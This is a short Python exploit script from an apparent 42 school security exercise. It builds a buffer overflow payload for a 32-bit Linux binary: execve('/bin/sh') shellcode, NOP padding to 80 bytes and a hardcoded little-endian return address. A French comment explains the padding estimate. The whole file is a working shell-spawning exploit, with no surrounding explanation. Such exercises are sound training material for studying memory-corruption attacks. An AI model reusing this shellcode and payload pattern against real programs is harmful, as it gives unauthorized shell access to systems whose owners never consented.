# **************************************************************************** #
#                                                                              #
#                                                         :::      ::::::::    #
#    attack.py                                          :+:      :+:    :+:    #
#                                                     +:+ +:+         +:+      #
#    By: lnaidu <lnaidu@student.42nice.fr>          +#+  +:+       +#+         #
#                                                 +#+#+#+#+#+   +#+            #
#    Created: 2024/07/25 12:03:16 by lnaidu            #+#    #+#              #
#    Updated: 2024/07/25 12:18:37 by lnaidu           ###   ########.fr        #
#                                                                              #
# **************************************************************************** #

import struct

shellcode = "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"

nop_sled ="\x90"*(80 - len(shellcode)) 
#Le chiffre 80 est une estimation qui inclut : Les 76 octets du buffer. Quelques octets supplémentaires pour couvrir les variables locales, l'alignement de la pile, et les variables temporaires.
payload = shellcode
payload += nop_sled
payload += "\x08\xa0\x04\x08" # Address in little-endian format

print(payload)